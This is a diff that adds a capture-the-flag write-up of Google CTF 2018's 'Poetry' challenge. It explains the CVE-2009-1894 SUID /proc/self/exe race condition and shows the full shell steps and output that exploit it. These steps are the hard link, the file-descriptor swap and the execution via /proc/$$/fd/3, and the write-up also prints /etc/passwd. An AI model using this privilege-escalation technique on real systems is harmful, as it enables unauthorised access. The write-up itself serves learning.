@@ -2268,3 +2268,203 @@ Our SQL injection is successful, and we are able to retrieve the flag.
 <br>
 ### Solution
 <b>CTF{fridge_cast_oauth_token_cahn4Quo}</b>
+
+
+
+<br>
+<br>
+## Poetry - pwn
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/96.png" alt="" class="center">
+<br>
+<br>
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/97.png" alt="" class="center">
+
+The attachment provides us with yet another binary to investigate. As usual, we disassemble the binary to see if there is anything of interest. We'll keep an eye out for anything related to SUIDs or potential SUID exploits.
+
+```bash
+root@kali:~/google-ctf-2018/poetry# r2 poetry
+Warning: Cannot initialize dynamic strings
+[0x00400890]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+
+[0x00400890]> s 0x004009ae
+
+[0x00400890]> s 0x004009ae
+
+[0x004009ae]> Vpp
+```
+
+<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/98.png" alt="" class="center">
+
+From this alone, the path to exploitation is not too clear. However, searching for vulnerabilities and exploits related to <b>LD_BIND_NOW</b>, <b>/proc/self/exe</b>, and SUID binaries returns a promising disclosure:
+<br>
+<br>
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894" target="_blank">PulseAudio race condition</a>
+
+At the time, the vulnerable SUID PulseAudio binary suffered from a race condition that allowed unprivileged users to take advantage of the SUID bit in PulseAudio. The method is described as follows:
+
+<i>Initial condition: When binary is started, <b>/proc/self/exe</b> points to full path name of current process (i.e. <b>/usr/bin/pulseaudio</b>)</i>
+
+1) Create hard link to vulnerable SUID binary in user-controlled directory
+<br>
+2) Execute hard link to SUID binary (<b>/proc/self/exe</b> points to hard link)<br>
+3) SUID binary checks if <b>LD_BIND_NOW</b> is set
+<br>
+4) <b>LD_BIND_NOW</b> not set, so binary sets <b>LD_BIND_NOW</b> and restarts
+<br>
+5) Before binary is restarted, hard link is replaced with exploit (<b>/proc/self/exe</b> now points to exploit)
+<br>
+6) SUID bit still preserved, binary restarts with <b>/proc/self/exe</b> pointing exploit
+<br>
+7) Exploit executed under privileges set by SUID
+<br>
+
+The question is, how do we replace the hard link before the program restarts and executes <b>readlink()</b>? Several methods are possible and summarized <a href="https://blog.stalkr.net/2010/11/exec-race-condition-exploitations.html" target="_blank">here</a>. A method using file descriptors is described in the following <a href="https://seclists.org/fulldisclosure/2010/Oct/257" target="_blank">disclosure</a> about the GNU C library dynamic linker.
+
+Let's go ahead and check out what we get when we connect to <b>poetry.ctfcompetition.com</b>.
+
+```bash
+root@kali:~/google-ctf-2018/poetry# nc poetry.ctfcompetition.com 1337
+asdfg
+/bin/bash: line 1: asdfg: command not found
+id
+uid=1338(user) gid=1337(poetry) groups=1337(poetry)
+
+ls -la
+total 72
+drwxr-xr-x  21 poetry poetry  4096 Oct 24 19:10 .
+drwxr-xr-x  21 poetry poetry  4096 Oct 24 19:10 ..
+-rwxr-xr-x   1 nobody nogroup    0 Oct 24 19:05 .dockerenv
+drwxr-xr-x   2 nobody nogroup 4096 Jun 18  2018 bin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 12  2016 boot
+drwxr-xr-x   4 nobody nogroup 4096 Oct 24 19:05 dev
+drwxr-xr-x  44 nobody nogroup 4096 Oct 24 19:05 etc
+drwxrwxrwt   4 poetry poetry    80 Jan 30 03:00 home
+drwxr-xr-x   8 nobody nogroup 4096 Sep 13  2015 lib
+drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 lib64
+drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 media
+drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 mnt
+drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 opt
+dr-xr-xr-x 115 nobody nogroup    0 Jan 30 03:00 proc
+drwx------   2 nobody nogroup 4096 Apr 17  2018 root
+drwxr-xr-x   5 nobody nogroup 4096 Apr 17  2018 run
+drwxr-xr-x   2 nobody nogroup 4096 Apr 27  2018 sbin
+drwxr-xr-x   3 nobody nogroup 4096 Jun 18  2018 srv
+drwxr-xr-x   2 nobody nogroup 4096 Feb  5  2016 sys
+drwxrwxrwt   2 poetry poetry    40 Jan 30 03:00 tmp
+drwxr-xr-x  10 nobody nogroup 4096 Apr 17  2018 usr
+drwxr-xr-x  11 nobody nogroup 4096 Apr 17  2018 var
+
+pwd
+/
+
+uname -a
+Linux jail-0 4.15.0-1015-gcp #15~16.04.1-Ubuntu SMP Thu Jul 26 20:37:01 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+env
+SHELL=
+OLDPWD=/home/poetry
+USER=unprivileged
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PWD=/home/user
+LANG=en_US.UTF-8
+HOME=/home/unprivileged
+SHLVL=2
+LOGNAME=unprivileged
+_=/usr/bin/env
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+user:x:1338:1338::/home/user:
+poetry:x:1337:1337::/home/poetry:
+```
+
+It appears we've got ourselves a shell as an unprivileged user named <b>user</b>. The only other user of interest is <b>poetry</b>. If we do some exploration on the file system, we'll find that <b>poetry</b> has a directory containing the binary that we downloaded from the attachment. We also have an empty directory under <b>user</b>.
+
+```bash
+cd /home
+ls -la
+total 4
+drwxrwxrwt  4 poetry poetry   80 Jan 30 03:16 .
+drwxr-xr-x 21 poetry poetry 4096 Oct 24 19:10 ..
+drwxr-xr-x  2 poetry poetry   80 Jan 30 03:16 poetry
+drwxrwxrwx  2 poetry poetry   40 Jan 30 03:16 user
+
+cd poetry
+ls -la
+total 900
+drwxr-xr-x 2 poetry poetry     80 Jan 30 03:16 .
+drwxrwxrwt 4 poetry poetry     80 Jan 30 03:16 ..
+-r-------- 1 poetry poetry     19 Jan 30 03:16 flag
+-rwsr-xr-x 1 poetry poetry 917192 Jan 30 03:16 poetry
+
+cd ../user
+ls -la
+total 0
+drwxrwxrwx 2 poetry poetry 40 Jan 30 03:16 .
+drwxrwxrwt 4 poetry poetry 80 Jan 30 03:16 ..
+```
+
+Now that we are in the <b>user</b> directory, we can create a hard link to the SUID <b>poetry</b> binary. If we open a file descriptor to the hardlink via <code>exec</code>, we can access the descriptor through <code>/proc/$$/fd/?</code>. The SUID property is preserved even if we now replace the hardlink <code>/proc/$$/fd/?</code> points to with our exploit. The result is shown below.
+
+```bash
+ln ../poetry/poetry cat
+
+ls -la
+total 896
+drwxrwxrwx 2 poetry poetry     60 Jan 30 03:12 .
+drwxrwxrwt 4 poetry poetry     80 Jan 30 02:57 ..
+-rwsr-xr-x 2 poetry poetry 917192 Jan 30 02:57 cat
+
+exec 3< ./cat
+ls -l /proc/$$/fd/3
+lr-x------ 1 user poetry 64 Jan 30 03:12 /proc/7/fd/3 -> /home/user/cat
+
+rm cat
+ls -l /proc/$$/fd/3 
+lr-x------ 1 user poetry 64 Jan 30 03:12 /proc/7/fd/3 -> /home/user/cat (deleted)
+
+cp /bin/cat '/home/user/cat (deleted)'
+
+ls -la
+total 52
+drwxrwxrwx 2 poetry poetry    60 Jan 30 03:14 .
+drwxrwxrwt 4 poetry poetry    80 Jan 30 02:57 ..
+-rwxr-xr-x 1 user   poetry 52080 Jan 30 03:14 cat (deleted)
+
+exec /proc/$$/fd/3 ../poetry/flag
+CTF{CV3-2009-1894}
+```
+
+
+<br>
+<br>
+### Solution
+<b>CTF{CV3-2009-1894}</b>
